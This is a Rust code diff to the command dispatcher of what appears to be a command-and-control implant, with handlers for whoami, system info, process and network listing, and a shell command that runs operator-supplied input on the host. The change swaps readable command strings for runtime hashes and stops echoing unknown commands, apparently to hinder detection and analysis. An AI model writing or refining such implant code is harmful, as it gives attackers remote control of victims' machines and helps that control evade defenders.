@@ -51,16 +51,20 @@ fn dispatch(command: &str, parameters: &str) -> link_common::CommandOutput {
     if let Some(output) = link_common::dispatch::dispatch_common(command, parameters) {
         return output;
     }
-    match command {
-        "whoami" if cfg!(feature = "cmd-whoami") => format!("{}@{}", username(), hostname()).into(),
-        "info" if cfg!(feature = "cmd-info") => collect_system_info().into(),
-        "ps" if cfg!(feature = "cmd-ps") => list_processes_browser(),
-        "netstat" if cfg!(feature = "cmd-netstat") => list_network_connections().into(),
-        "shell" if cfg!(feature = "cmd-shell") => {
+    match link_common::cmd_hash_runtime(command) {
+        link_common::cmds::WHOAMI if cfg!(feature = "cmd-whoami") => {
+            format!("{}@{}", username(), hostname()).into()
+        }
+        link_common::cmds::INFO if cfg!(feature = "cmd-info") => collect_system_info().into(),
+        link_common::cmds::PS if cfg!(feature = "cmd-ps") => list_processes_browser(),
+        link_common::cmds::NETSTAT if cfg!(feature = "cmd-netstat") => {
+            list_network_connections().into()
+        }
+        link_common::cmds::SHELL if cfg!(feature = "cmd-shell") => {
             let cmd = link_common::extract_param(parameters, "command");
             shell_exec(if cmd.is_empty() { parameters } else { &cmd }).into()
         }
-        _ => format!("[-] unknown command: {}", command).into(),
+        _ => link_common::CommandOutput::text("[-] unknown command".to_string()),
     }
 }
 
